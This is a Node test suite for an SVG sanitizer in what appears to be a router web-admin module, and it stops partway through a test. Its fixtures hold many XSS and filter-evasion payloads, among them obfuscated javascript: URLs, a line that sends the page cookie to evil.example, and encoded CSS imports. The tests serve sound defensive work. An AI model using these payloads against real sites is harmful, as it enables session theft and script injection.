/* `_sanitizeSvg` (fs-assets.js): the uploaded-pattern path CLEANS an SVG, removing unsafe elements
 * and attributes one at a time; only four things stay a refusal: not an SVG, a parser error, the
 * wrong namespace, or nothing left. NOT the security boundary (the CGI's CSP header is); it gives an
 * admin whose export carries an editor artefact a working tile and a note.
 *
 * Node ships no `DOMParser`/`XMLSerializer`, so this is a small tree from a regex-flat tokenizer,
 * not a browser's XML engine. It models tag/attribute names and values, nesting, element and
 * attribute removal, a serializer, Text/CDATA nodes with the numeric and five named entities (a
 * `<style>` is judged on its text, an href on its decoded value), and element namespaces (Namespaces
 * in XML §5.3, `xml:` reserved per §4), so a fixture can prove `localName` removal is namespace-
 * oblivious and write a root spelled `svg` in another namespace. It proves the FUNCTION's decisions,
 * not that a real engine tokenises `url(`/CSS escapes alike; that half is the engine measurements
 * cited in fs-assets.js. */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { loadModule } from './lib/luci-module.mjs';

const SVG_NS = 'http://www.w3.org/2000/svg';
const XML_NS = 'http://www.w3.org/XML/1998/namespace';

/* ---- the fake tree: just enough of Element/ProcessingInstruction/Document to sanitize ---- */

const TAG_TOKEN_RE = /<\?([^>]*)\?>|<!--[\s\S]*?-->|<\/([A-Za-z_:][-\w:.]*)\s*>|<([A-Za-z_:][-\w:.]*)([^<>]*?)\/>|<([A-Za-z_:][-\w:.]*)([^<>]*)>|<!\[CDATA\[([\s\S]*?)\]\]>/g;
const ATTR_RE = /([A-Za-z_:][-\w:.]*)\s*=\s*(?:"([^"]*)"|'([^']*)')/g;

/* A real parser hands the DOM the DECODED value, so `&#106;avascript:` reaches the sanitizer as
 * `javascript:`; the serializer escapes `& < >` back. Numeric references and the five named ones are
 * all XML defines without a DTD. */
function decodeEntities(s) {
	return s.replace(/&(?:#x([0-9a-fA-F]+)|#([0-9]+)|(lt|gt|amp|quot|apos));/g, (m, hx, dc, name) =>
		name ? { lt: '<', gt: '>', amp: '&', quot: '"', apos: "'" }[name]
			: String.fromCodePoint(parseInt(hx || dc, hx ? 16 : 10)));
}
function escapeText(s) { return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }

function parseAttrs(blob) {
	const attrs = [];
	ATTR_RE.lastIndex = 0;
	let am;
	while ((am = ATTR_RE.exec(blob)) !== null)
		attrs.push({ name: am[1], value: decodeEntities(am[2] !== undefined ? am[2] : am[3]) });
	return attrs;
}

class FakeElement {
	constructor(tagName, attrs) {
		this.tagName = tagName;
		this.nodeName = tagName;
		this.localName = tagName.includes(':') ? tagName.split(':').pop() : tagName;
		this.namespaceURI = null;			/* resolved by parseXml once the in-scope declarations are known */
		this.nodeType = 1;
		this._attrs = attrs;
		this.childNodes = [];
		this.parentNode = null;
		this._removed = false;
	}
	get attributes() { return this._attrs.slice(); }
	getAttribute(name) { const a = this._attrs.find((x) => x.name === name); return a ? a.value : null; }
	get children() { return this.childNodes.filter((n) => n.nodeType === 1); }
	/* Text and CDATA of every descendant; a PI contributes nothing, as in a real DOM (comments never
	 * become nodes here at all). An element child's text lands in the middle of its parent's, which
	 * is exactly what the CSS engine does NOT do: it reads the direct Text/CDATA children only. */
	get textContent() {
		return this.childNodes.map((n) => (n.nodeType === 1 ? n.textContent : n.nodeType === 7 ? '' : n.data)).join('');
	}
	get isConnected() { return !this._removed && (!this.parentNode || this.parentNode.isConnected); }
	setAttribute(name, value) {
		const a = this._attrs.find((x) => x.name === name);
		if (a) a.value = value; else this._attrs.push({ name, value });
	}
	removeAttribute(name) { this._attrs = this._attrs.filter((x) => x.name !== name); }
	appendChild(node) { node.parentNode = this; this.childNodes.push(node); return node; }
	remove() {
		this._removed = true;
		if (this.parentNode) this.parentNode.childNodes = this.parentNode.childNodes.filter((n) => n !== this);
		this.parentNode = null;
	}
	querySelectorAll() {
		const out = [];
		const walk = (n) => { for (const c of n.childNodes) if (c.nodeType === 1) { out.push(c); walk(c); } };
		walk(this);
		return out;
	}
}

class FakeText {
	constructor(data, cdata) { this.nodeType = cdata ? 4 : 3; this.data = data; this.parentNode = null; }
}

class FakePI {
	constructor(data) { this.nodeType = 7; this.data = data; this.parentNode = null; this._removed = false; }
	remove() {
		this._removed = true;
		if (this.parentNode) this.parentNode.childNodes = this.parentNode.childNodes.filter((n) => n !== this);
		this.parentNode = null;
	}
}

/* Real DOMParser never exposes the XML DECLARATION (`<?xml version="1.0"?>`) as a node at all — it
 * is consumed by the parser, and "xml" is a reserved PI target no document may actually use for one
 * (XML 1.0 §2.6). An ordinary PI (`<?xml-stylesheet …?>`) IS a node. Skipping the declaration here
 * is what lets an Inkscape-shaped fixture that opens with one round-trip untouched, the way it does
 * in a real browser. */
function isXmlDeclaration(data) { return (/^xml\s/i).test(data) || (/^xml$/i).test(data); }

/* The top-level container itself: a real `document.childNodes` is live, and `n.remove()` on a
 * top-level PROCESSING_INSTRUCTION removes it from THAT list, not from a plain array snapshot —
 * `doc` needs to be something a node's `remove()` can reach back into, the same as an element's
 * `parentNode` does for a nested one. */
class FakeDocument {
	constructor() { this.childNodes = []; }
	get isConnected() { return true; }
	appendChild(n) { n.parentNode = this; this.childNodes.push(n); return n; }
	querySelector() { return null; }
}

/* The bindings in scope AT an element: `xmlns` sets the no-prefix default, `xmlns:x` sets prefix
 * `x` — both ordinary attributes as well as declarations, so they stay in `attrs` untouched; this
 * only reads them back out. */
function nsDeclarations(attrs) {
	const decls = new Map();
	for (const a of attrs) {
		if (a.name === 'xmlns') decls.set('', a.value);
		else if (a.name.slice(0, 6) === 'xmlns:') decls.set(a.name.slice(6), a.value);
	}
	return decls;
}

/* `xml` resolves to its fixed URI even with no declaration in scope at all (Namespaces in XML §4);
 * every other prefix, including the no-prefix default (`''`), is whatever the nearest declaration
 * up the tree set it to, or `null` if nothing ever did. */
function resolveNs(prefix, scope) {
	if (prefix === 'xml') return XML_NS;
	return scope.has(prefix) ? scope.get(prefix) : null;
}

function parseXml(text) {
	const doc = new FakeDocument();
	doc._nsScope = new Map();
	let root = null;
	const stack = [];
	TAG_TOKEN_RE.lastIndex = 0;
	let m, prev = 0;
	while ((m = TAG_TOKEN_RE.exec(text)) !== null) {
		const gap = text.slice(prev, m.index);
		prev = TAG_TOKEN_RE.lastIndex;
		if (gap && stack.length) stack[stack.length - 1].appendChild(new FakeText(decodeEntities(gap), false));
		if (m[7] !== undefined) {
			if (stack.length) stack[stack.length - 1].appendChild(new FakeText(m[7], true));
			continue;
		}
		if (m[1] !== undefined) {
			if (isXmlDeclaration(m[1])) continue;
			const pi = new FakePI(m[1]);
			(stack.length ? stack[stack.length - 1] : doc).appendChild(pi);
			continue;
		}
		if (m[2] !== undefined) { stack.pop(); continue; }
		const selfClose = m[3] !== undefined;
		const tag = selfClose ? m[3] : m[5];
		if (tag === undefined) continue;			/* a comment: no capture group matched */
		const attrsBlob = selfClose ? m[4] : m[6];
		const attrs = parseAttrs(attrsBlob);
		const el = new FakeElement(tag, attrs);
		/* An element's own `xmlns`/`xmlns:*` apply to ITSELF too, not only its descendants — so they
		 * are folded into a copy of the parent's scope before this element's own prefix is looked up
		 * in it, the same order a real namespace-aware parser resolves in. */
		const parentScope = stack.length ? stack[stack.length - 1]._nsScope : doc._nsScope;
		const scope = new Map(parentScope);
		for (const [ prefix, uri ] of nsDeclarations(attrs)) scope.set(prefix, uri);
		el._nsScope = scope;
		el.namespaceURI = resolveNs(tag.includes(':') ? tag.split(':')[0] : '', scope);
		(stack.length ? stack[stack.length - 1] : doc).appendChild(el);
		if (!root && !stack.length) root = el;
		if (!selfClose) stack.push(el);
	}
	doc.documentElement = root;
	return doc;
}

class FakeDOMParser {
	parseFromString(text) { return parseXml(text); }
}

function serializeAttrs(el) {
	return el.attributes.map((a) => ' ' + a.name + '="' + escapeText(String(a.value)).replace(/"/g, '&quot;') + '"').join('');
}
function serializeNode(n) {
	if (n.nodeType === 7) return '<?' + n.data + '?>';
	if (n.nodeType === 3) return escapeText(n.data);
	if (n.nodeType === 4) return '<![CDATA[' + n.data + ']]>';
	const attrs = serializeAttrs(n);
	if (!n.childNodes.length) return '<' + n.tagName + attrs + '/>';
	return '<' + n.tagName + attrs + '>' + n.childNodes.map(serializeNode).join('') + '</' + n.tagName + '>';
}
class FakeXMLSerializer {
	serializeToString(doc) { return doc.childNodes.map(serializeNode).join(''); }
}

function svg(inner) {
	return '<svg xmlns="' + SVG_NS + '">' + inner + '</svg>';
}

function sanitize(text) {
	globalThis.DOMParser = FakeDOMParser;
	globalThis.XMLSerializer = FakeXMLSerializer;
	/* bare globals, the same way `installBrowserGlobals()` supplies MutationObserver etc for other
	 * suites: a `new Function(...)`-built factory runs in the GLOBAL scope, so `window._`/`window.E`
	 * in luci-module.mjs's fakes never reach a bare `_(...)`/`Node.…` reference at module top level. */
	globalThis.Node = globalThis.Node || { PROCESSING_INSTRUCTION_NODE: 7 };
	globalThis._ = globalThis._ || ((s) => s);
	const mod = loadModule('fs-assets', { stubs: { rpc: { declare: () => () => {} }, ui: { addNotification: () => {} } } });
	return mod._sanitizeSvg(text);
}

function cssUnescape(v) {
	return loadModule('fs-assets', { stubs: { rpc: { declare: () => () => {} }, ui: { addNotification: () => {} } } })._cssUnescape(v);
}

/* Walks the OUTPUT text back through the same fake parser, so a "still parses as SVG" assertion
 * checks the serializer's own output rather than trusting the counters alone. */
function reparse(text) {
	return new FakeDOMParser().parseFromString(text);
}

test('a clean Inkscape-shaped file round-trips byte-identical', () => {
	const original = '<?xml version="1.0" encoding="UTF-8" standalone="no"?>\n' +
		svg('<path d="M0 0" style="fill:#100f0d;fill-opacity:1;fill-rule:nonzero;stroke:none"/>');
	const result = sanitize(original);
	assert.equal(result.error, undefined);
	assert.equal(result.text, original);
	assert.equal(result.elements, undefined);
	assert.equal(result.refs, undefined);
});

test('a style attribute referencing a same-document fragment survives untouched', () => {
	const original = svg('<path style="fill:url(#grad)"/>');
	const result = sanitize(original);
	assert.equal(result.error, undefined);
	assert.equal(result.text, original);
});

test('a script element is removed and the result still parses as SVG', () => {
	const result = sanitize(svg('<script>alert(1)</script><path d="M0 0"/>'));
	assert.equal(result.error, undefined);
	assert.equal(result.elements, 1);
	assert.equal(result.refs, 0);
	assert.ok(!(/script/i).test(result.text));
	const doc = reparse(result.text);
	assert.equal(doc.documentElement.localName, 'svg');
	assert.ok(!doc.documentElement.querySelectorAll().some((el) => el.localName === 'script'));
});

test('an onload handler and a javascript: xlink:href are removed', () => {
	const original = svg('<path onload="alert(1)" d="M0 0"/><a xlink:href="javascript:alert(1)"><path d="M1 1"/></a>');
	const result = sanitize(original);
	assert.equal(result.error, undefined);
	assert.equal(result.elements, 0);
	assert.equal(result.refs, 2);
	assert.ok(!(/onload/i).test(result.text));
	assert.ok(!(/javascript:/i).test(result.text));
});

test('style="background:url(//evil)" loses that declaration and keeps the rest', () => {
	const result = sanitize(svg('<rect style="fill:#fff;background:url(//evil.example/x.png)"/>'));
	assert.equal(result.error, undefined);
	assert.equal(result.refs, 1);
	assert.ok(!(/evil\.example/).test(result.text));
	assert.ok((/fill:#fff/).test(result.text));
});

test('a CSS hex-escape hiding url() in a style attribute is stripped — closes the LOW finding', () => {
	/* `\72` is 'r': a real tokenizer resolves `u\72l(` to `url(` (CSS Syntax Level 3 §4.3.7). The
	 * finding this closes: the old literal `url\s*\(` match never saw it. */
	const result = sanitize(svg('<rect style="background:u\\72l(//evil.example/x)"/>'));
	assert.equal(result.error, undefined);
	assert.equal(result.refs, 1);
	assert.ok(!(/evil\.example/).test(result.text));
});

test('a hex-escape ended by CR LF is one whitespace, so url() behind it is still stripped from a style attribute', () => {
	/* CSS Syntax §3.3 folds CR LF to LF before tokenizing; `&#13;&#10;` survives XML attribute
	 * normalisation as a real CR LF, and the escape's one optional whitespace must take both. */
	const result = sanitize(svg('<rect style="fill:#fff;background:u\\72&#13;&#10;l(//evil.example/x)"/>'));
	assert.equal(result.error, undefined);
	assert.equal(result.refs, 1);
	assert.ok(!(/evil\.example/).test(result.text));
	assert.ok((/fill:#fff/).test(result.text));
});

test('an out-of-range CSS escape decodes to U+FFFD instead of throwing, and url() behind it is still caught', () => {
	/* Only `\FFFFFF` and `\110000` (> U+10FFFF) make `String.fromCodePoint` throw; `\0` and the surrogate
	 * `\D800` pass through it, and are U+FFFD by CSS Syntax 3 §4.3.7 (the unescape test below). */
	for (const esc of [ '\\FFFFFF', '\\110000', '\\0', '\\D800' ]) {
		const original = svg('<rect style="content:\'' + esc + '\'"/>');
		let result;
		assert.doesNotThrow(() => { result = sanitize(original); });
		assert.equal(result.error, undefined);
		assert.equal(result.text, original);
	}
	const hostile = sanitize(svg('<rect style="content:\'\\FFFFFF\';background:u\\72l(//evil.example/x)"/>'));
	assert.equal(hostile.error, undefined);
	assert.equal(hostile.refs, 1);
	assert.ok(!(/evil\.example/).test(hostile.text));
	assert.ok((/content:/).test(hostile.text));
});

test('a CSS escape of zero, a surrogate or past U+10FFFF decodes to U+FFFD', () => {
	/* The sanitiser returns the original text untouched, so only the decoder's output shows this branch. */
	for (const esc of [ '\\0', '\\D800', '\\110000', '\\FFFFFF' ])
		assert.equal(cssUnescape(esc), '\uFFFD', esc);
});

test('a file empty after cleaning is refused, not silently emptied', () => {
	const result = sanitize(svg('<script>alert(1)</script>'));
	assert.ok(result.error);
	assert.equal(result.text, undefined);
});

test('a non-SVG file is refused', () => {
	const result = sanitize('not xml at all');
	assert.ok(result.error);
	assert.equal(result.text, undefined);
});

test('a processing instruction outside the root is removed', () => {
	const result = sanitize('<?xml-stylesheet href="evil.xsl" type="text/xsl"?>' + svg('<path d="M0 0" style="fill:red"/>'));
	assert.equal(result.error, undefined);
	assert.equal(result.elements, 1);
	assert.ok(!(/xml-stylesheet/i).test(result.text));
});

test('a root spelled svg but namespaced xhtml is refused — the namespace check, not the spelling', () => {
	/* Only provable once the fake resolves namespaces for real: with a hardcoded SVG_NS every root
	 * looked clean regardless of its own xmlns, so this fixture could not previously fail the way
	 * production's check means it to. */
	const result = sanitize('<svg xmlns="http://www.w3.org/1999/xhtml"><path d="M0 0"/></svg>');
	assert.ok(result.error);
	assert.equal(result.text, undefined);
});

test('a prefixed s:script in the SVG namespace is removed by localName, not by its qualified name', () => {
	const result = sanitize(svg('<s:script xmlns:s="' + SVG_NS + '">alert(1)</s:script><path d="M0 0"/>'));
	assert.equal(result.error, undefined);
	assert.equal(result.elements, 1);
	assert.ok(!(/alert/i).test(result.text));
});

test('an unprefixed script re-namespaced to xhtml is still removed — by its namespace now', () => {
	/* The child's own `xmlns` overrides the root's default, so this element genuinely resolves to the
	 * xhtml namespace rather than inheriting SVG_NS; only SVG-namespace elements are kept at all. */
	const result = sanitize(svg('<script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script><path d="M0 0"/>'));
	assert.equal(result.error, undefined);
	assert.equal(result.elements, 1);
	assert.ok(!(/alert/i).test(result.text));
});

/* ---- elements: only the SVG namespace is kept ----
 * A browser gives behaviour to XHTML and MathML elements inside an image/svg+xml document, and a
 * list of the dangerous names cannot be complete: `<h:frame src="javascript:…">` ran same-origin on a
 * direct open (it can read the session cookie), `<h:img src>` / `srcset` / `<h:input type=image>` /
 * `<h:table background>` / `<h:meta refresh>` all fetch. No attribute check below is involved in these
 * cases — the namespace rule alone removes the element, and everything under it with it. */

const XH = 'xmlns:h="http://www.w3.org/1999/xhtml"';
const JSURL = "javascript:new Image().src='http://evil.example/x?'+parent.document.cookie";

test('every element outside the SVG namespace is removed whole, with nothing else looking at it', () => {
	const hostile = [
		'<h:frameset ' + XH + '><h:frame src="' + JSURL + '"/></h:frameset>',
		'<h:frame ' + XH + ' src="' + JSURL + '"/>',
		'<h:frame ' + XH + ' src="java&#9;script:alert(1)"/>',
		'<h:frame ' + XH + ' src="JaVaScRiPt:alert(1)"/>',
		'<h:frame ' + XH + ' srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;" src="about:blank"/>',
		'<h:img ' + XH + ' src="http://evil.example/i.png"/>',
		'<h:img ' + XH + ' srcset="http://evil.example/i.png 1x"/>',
		'<h:picture ' + XH + '><h:source srcset="http://evil.example/i.png"/><h:img src="x"/></h:picture>',
		'<h:input ' + XH + ' type="image" src="http://evil.example/i.png"/>',
		'<h:table ' + XH + ' background="http://evil.example/i.png"><h:tr><h:td>x</h:td></h:tr></h:table>',
		'<h:meta ' + XH + ' http-equiv="refresh" content="0;url=http://evil.example/r"/>',
		'<h:a ' + XH + ' href="' + JSURL + '">x</h:a>',
		'<img xmlns="http://www.w3.org/1999/xhtml" src="http://evil.example/i.png"/>',
		'<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>x</mi></math>',
		'<image xmlns="http://www.w3.org/1999/xhtml" href="' + PNG + '"/>',
		'<s:image xmlns:s="http://evil.example/ns" href="' + PNG + '"/>',
		/* an SVG element carrying an HTML-namespace child is gone with the child; the SVG parent stays */
		'<g><h:img ' + XH + ' src="http://evil.example/i.png"/></g>'
	];
	for (const inner of hostile) {
		const result = sanitize(svg(inner + '<path d="M0 0"/>'));
		assert.equal(result.error, undefined, inner);
		assert.equal(result.elements, 1, inner);
		assert.equal(result.refs, 0, inner);
		assert.ok(!(/evil\.example|javascript|alert|h:|<img|<math|<s:image/i).test(result.text), inner);
		assert.ok(result.text.includes('<path d="M0 0"/>'), inner);
	}
	/* foreignObject is an SVG element: it goes by name, and its xhtml content with it */
	const fo = sanitize(svg('<foreignObject><h:body ' + XH + '><h:script>alert(1)</h:script></h:body></foreignObject><path d="M0 0"/>'));
	assert.equal(fo.elements, 1);
	assert.ok(!(/foreignObject|alert/).test(fo.text));
});

test('editor metadata outside the SVG namespace is removed too, the SVG elements around it stay', () => {
	const result = sanitize(svg(
		'<sodipodi:namedview xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd" pagecolor="#fff"/>' +
		'<metadata><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description rdf:about=""/></rdf:RDF></metadata>' +
		'<path d="M0 0" inkscape:label="p" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"/>'));
	assert.equal(result.error, undefined);
	assert.equal(result.elements, 2);			/* namedview, rdf:RDF (Description goes with it) */
	assert.equal(result.refs, 0);
	assert.ok(result.text.includes('<metadata/>'));
	assert.ok(!(/namedview|rdf:/).test(result.text));
	assert.ok((/inkscape:label="p"/).test(result.text));
});

test('an attribute in a namespace is not a CSS value: editor labels with "image (" or "src (" stay untouched', () => {
	/* The false positives of judging every attribute with the style helper: Inkscape writes the file
	 * name and the layer label into namespaced attributes, and a label can contain any words. */
	const NSD = ' xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"';
	for (const attrs of [
		'sodipodi:docname="image (1).svg"', 'inkscape:label="Layer src (2)"', 'inkscape:label="url(//evil.example/x)"',
		'inkscape:label="Background image (white)" inkscape:groupmode="layer"',
		/* no namespace, but not a function either: `image (` has a space, `data-src(` is another ident */
		'id="image (1)"', 'class="src (a)"', 'aria-label="Select an image (optional)"', 'data-note="see image  (1)"',
		'style="content:\'image (1)\';fill:#000"'
	]) {
		const original = '<svg xmlns="' + SVG_NS + '"' + NSD + '><path ' + attrs + ' d="M0 0"/></svg>';
		const result = sanitize(original);
		assert.equal(result.error, undefined, attrs);
		assert.equal(result.text, original, attrs);
		assert.equal(result.refs, undefined, attrs);
	}
});

test('xml:base on a non-root element is removed, closing the same-document href it would redirect off-router — LOW finding', () => {
	/* `#g` is a fragment, which the href allowlist keeps, and the base moved instead of the reference:
	 * under `xml:base="http://evil.example/"` it resolves to evil.example. Nested under a non-root
	 * element on purpose: the check has to walk the whole tree, not just the root, to close this. */
	const result = sanitize(svg('<g xml:base="http://evil.example/"><use href="#g"/></g>'));
	assert.equal(result.error, undefined);
	assert.equal(result.refs, 1);
	assert.ok(!(/evil\.example/).test(result.text));
	assert.ok((/href="#g"/).test(result.text));
});

/* ---- <style> and raster data: — what image mode can keep, and what still goes ----
 * Both are inert where the file is painted (mask-image, background-image, <img>): no script, no
 * off-document fetch. The sanitizer keeps them for a file that needs them and removes them as soon
 * as they reach off the document, which is what the second half of this block holds. */

const PNG = 'data:image/png;base64,iVBORw0KGgo=';

test('an Illustrator-shaped internal <style> survives byte-identical, and class-styled shapes keep it', () => {
	const original = '<?xml version="1.0" encoding="UTF-8"?>\n' +
		svg('<defs><style>.cls-1{fill:none;stroke:#000;stroke-miterlimit:10;}.cls-2{fill:url(#grad)}</style></defs>' +
			'<path class="cls-1" d="M0 0"/>');
	const result = sanitize(original);
	assert.equal(result.error, undefined);
	assert.equal(result.text, original);
	assert.equal(result.elements, undefined);
	assert.equal(result.refs, undefined);
});

test('a CDATA <style> with a child combinator survives, and survives a serialize round-trip', () => {
	const css = '.a > .b{fill:url(#g)}';
	const clean = svg('<style><![CDATA[' + css + ']]></style><path class="a"/>');
	assert.equal(sanitize(clean).text, clean);
	/* something else is removed, so the whole tree is serialized: the stylesheet must come back whole */
	const result = sanitize(svg('<style>' + css.replaceAll('>', '&gt;') + '</style><script>x</script><path class="a"/>'));
	assert.equal(result.elements, 1);
	assert.ok(result.text.includes('<style>.a &gt; .b{fill:url(#g)}</style>'));
});

test('a hostile <style> is removed whole and counted, a clean sibling <style> stays', () => {
	const result = sanitize(svg('<style>.ok{fill:#000}</style><style>@import url(//evil.example/x.css)</style><path class="ok"/>'));
	assert.equal(result.error, undefined);
	assert.equal(result.elements, 1);
	assert.equal(result.refs, 0);
	assert.ok(!(/evil\.example/).test(result.text));
	assert.ok(result.text.includes('<style>.ok{fill:#000}</style>'));
});

test('a <style> that reaches off the document is removed, in every spelling', () => {
	const hostile = [
		'@import url(//evil.example/x.css)',
		'@import "x.css"',
		'@IMPORT url(x.css)',
		'.a{background:url(//evil.example/x.png)}',
		'.a{background:url(https://evil.example/x.png)}',
		'.a{background:url(x.png)}',
		'.a{background:url(\'x.png\')}',
		'.a{background:url( "x.png" )}',
		'.a{background:URL (x.png)}',
		'.a{fill:url(#g)}.b{background:url(//evil.example/x)}',
		'.a{background:url(data:image/png;base64,AAAA)}',
		'.a{background:url("data:image/svg+xml;utf8,%3Csvg%3E")}',
		'@font-face{font-family:f;src:url(//evil.example/f.woff)}',
		'.a{width:expression(alert(1))}',
		'.a{background:image-set("//evil.example/x.png" 1x)}',
		'.a{background:-webkit-image-set("x.png" 1x)}',
		'.a{background:image("x.png")}',
		'.a{background:cross-fade(url(#g), "x.png", 50%)}',
		'.a{background:u\\72l(//evil.example/x)}',
		'\\40 import "x.css"',
		'@\\69mport "x.css"',
		/* the XML layer decodes these before the CSS engine sees them */
		'.a{background:&#117;rl(//evil.example/x)}',
		'&#64;import "x.css"',
		'.a{background:u&#x72;l(x.png)}',
		/* CSS Syntax §3.3 folds CR LF to one LF before tokenizing, so the single whitespace that ends a
		 * hex escape eats BOTH characters of &#13;&#10; and `u\72<CRLF>l(` is `url(` */
		'.a{background:u\\72&#13;&#10;l(//evil.example/x)}',
		'@\\69&#13;&#10;mport "x.css"',
		'@font-face{font-family:f;src:u\\72&#13;&#10;l(//evil.example/f.woff)}',
		'.a{background:u\\72&#13;l(//evil.example/x)}',
		/* a PI inside the text is not text: the CSS engine reads `@import` straight across it */
		'@imp<?x y?>ort "x.css"'
	];
	for (const css of hostile) {
		const result = sanitize(svg('<style>' + css + '</style><path d="M0 0"/>'));
		assert.equal(result.error, undefined, css);
		assert.equal(result.elements, 1, css);
		assert.ok(!(/<style/).test(result.text), css);
		assert.ok(!(/evil\.example|x\.png|x\.css/).test(result.text), css);
	}
	/* CDATA, a comment splitting the text, a style in <defs>, a prefixed or re-namespaced style */
	for (const inner of [
		'<style><![CDATA[@import url(//evil.example/x.css);]]></style>',
		'<style>@import<!-- c --> url(//evil.example/x.css)</style>',
		'<defs><style>.a{background:url(//evil.example/x)}</style></defs>',
		'<s:style xmlns:s="' + SVG_NS + '">@import "x.css"</s:style>',
		'<style xmlns="http://www.w3.org/1999/xhtml">@import "x.css"</style>',
		'<STYLE>@import "x.css"</STYLE>'
	]) {
		const result = sanitize(svg(inner + '<path d="M0 0"/>'));
		assert.equal(result.error, undefined, inner);
		assert.equal(result.elements, 1, inner);
		assert.ok(!(/style/i).test(result.text), inner);
	}
});

test('a <style> with an element inside is removed whole: the CSS engine skips the element, textContent does not', () => {
	/* A browser reads a <style> from its DIRECT Text/CDATA children only (measured on Chromium, Firefox
	 * and WebKit), so `@imp<x>z</x>ort` is `@import` to the engine. `textContent` of the same node is
	 * `@impzort`, which no pattern matches. */
	const hostile = [
		'<style>@imp<x>z</x>ort "https://evil.example/bypass.css";</style>',
		'<style>.a{background:u<x>z</x>rl(//evil.example/x)}</style>',
		'<style>@import "https://evil.example/x.css"<x/>;</style>',
		'<style><x>@import "https://evil.example/x.css"</x></style>',
		'<style><svg:g xmlns:svg="' + SVG_NS + '"/>.a{fill:none}</style>',
		'<style>@imp<![CDATA[ort "https://evil.example/x.css"]]><x/></style>'
	];
	for (const inner of hostile) {
		const result = sanitize(svg(inner + '<path d="M0 0"/>'));
		assert.equal(result.error, undefined, inner);
		assert.equal(result.elements, 1, inner);
		assert.ok(!(/<style|evil\.example/).test(result.text), inner);
	}
	/* the fixture is a real divergence in the fake too, not a string the old check also caught */
	const probe = parseXml(svg(hostile[0])).documentElement.children[0];
	assert.equal(probe.textContent.includes('@import'), false);
	/* a clean style with comment/PI splits and no element child still survives */
	const clean = svg('<style>.a{fill:#000}<!-- c --><?x y?>.b{fill:url(#g)}</style><path class="a"/>');
	assert.equal(sanitize(clean).text, clean);
});

test('a raster data: on an SVG <image> survives untouched, in href and xlink:href', () => {
	for (const href of [
		PNG, 'data:image/jpeg;base64,/9j/4AAQ', 'data:image/jpg;base64,/9j/4AAQ', 'data:image/gif;base64,R0lGOD',
		'data:image/webp;base64,UklGR', 'data:image/avif;base64,AAAA', 'data:image/bmp;base64,Qk0=', 'data:image/png,%89PNG', 'DATA:IMAGE/PNG;BASE64,AAAA', '  ' + PNG + '  ',
		/* a TAB inside the scheme is dropped by the URL parser, so this is still a png data: URL */
		'da&#9;ta:image/png;base64,AAAA'
	]) {
		for (const attr of [ 'href', 'xlink:href' ]) {
			const original = svg('<image ' + attr + '="' + href + '" width="8" height="8"/>');
			const result = sanitize(original);
			assert.equal(result.error, undefined, href);
			assert.equal(result.text, original, href);
			assert.equal(result.refs, undefined, href);
		}
	}
});

test('data: is removed on every href that is not a raster on an SVG <image>', () => {
	const html = 'data:text/html;base64,PHNjcmlwdD4=';
	const svgDoc = 'data:image/svg+xml;utf8,%3Csvg%3E%3C/svg%3E';
	const cases = [
		[ '<a href="' + html + '"><path d="M0 0"/></a>', 'a' ],
		[ '<a xlink:href="' + html + '"><path d="M0 0"/></a>', 'a' ],
		[ '<use href="' + svgDoc + '#x"/>', 'use' ],
		[ '<use xlink:href="' + svgDoc + '#x"/>', 'use' ],
		[ '<feImage href="' + PNG + '"/>', 'feImage' ],
		[ '<feImage xlink:href="' + PNG + '"/>', 'feImage' ],
		[ '<image href="' + svgDoc + '"/>', 'image' ],
		[ '<image href="data:image/svg+xml;base64,PHN2Zz4="/>', 'image' ],
		[ '<image href="' + html + '"/>', 'image' ],
		[ '<image href="data:,hello"/>', 'image' ],
		[ '<image href="data:application/octet-stream;base64,AAAA"/>', 'image' ],
		[ '<image href="data:image/pngx;base64,AAAA"/>', 'image' ],
		[ '<image href="data:image/png"/>', 'image' ],
		[ '<image href="data: image/png;base64,AAAA"/>', 'image' ],
		[ '<image href="blob:https://evil.example/uuid"/>', 'image' ],
		[ '<image href="about:blank"/>', 'image' ],
		[ '<textPath href="' + PNG + '"/>', 'textPath' ],
		/* only the lower-case `image` is exempt (a foreign-namespace one never gets this far) */
		[ '<IMAGE href="' + PNG + '"/>', 'IMAGE' ],
		/* case, leading whitespace, entity-encoded and TAB/LF-split schemes resolve to the same data: */
		[ '<a href="DATA:text/html,x"/>', 'a' ],
		[ '<a href="  data:text/html,x"/>', 'a' ],
		[ '<a href="&#100;ata:text/html,x"/>', 'a' ],
		[ '<a href="&#x64;ata&#58;text/html,x"/>', 'a' ],
		[ '<a href="da&#9;ta:text/html,x"/>', 'a' ],
		[ '<a href="da&#10;ta:text/html,x"/>', 'a' ],
		[ '<image href="&#100;ata:image/svg+xml;base64,PHN2Zz4="/>', 'image' ],
		[ '<image href="da&#9;ta:image/svg+xml;base64,PHN2Zz4="/>', 'image' ],
		[ '<image href="DATA:text/html,x"/>', 'image' ],
		[ '<image href="BLOB:x"/>', 'image' ]
	];
	for (const [ inner, tag ] of cases) {
		const result = sanitize(svg(inner + '<path d="M0 0"/>'));
		assert.equal(result.error, undefined, inner);
		assert.equal(result.refs, 1, inner);
		assert.equal(result.elements, 0, inner);
		assert.ok(result.text.includes('<' + tag), inner);			/* the element stays, the attribute goes */
		assert.ok(!(/href=/).test(result.text), inner);
	}
});

test('an off-router or javascript: href is removed on <image> too, in every spelling', () => {
	for (const href of [
		'//evil.example/x.png', 'https://evil.example/x.png', '/&#9;/evil.example/x.png',
		'javascript:alert(1)', 'JaVaScRiPt:alert(1)', '  javascript:alert(1)', '&#106;avascript:alert(1)',
		'&#x6A;avascript&#58;alert(1)', 'javas&#9;cript:alert(1)', 'java&#10;script:alert(1)', 'javascript&#9;:alert(1)'
	]) {
		const result = sanitize(svg('<image href="' + href + '"/><a xlink:href="' + href + '"><path d="M0 0"/></a>'));
		assert.equal(result.error, undefined, href);
		assert.equal(result.refs, 2, href);
		assert.ok(!(/href=/).test(result.text), href);
	}
});

test('a backslash is a slash to the URL parser: \\\\host and /\\host are off-router hrefs too', () => {
	for (const href of [
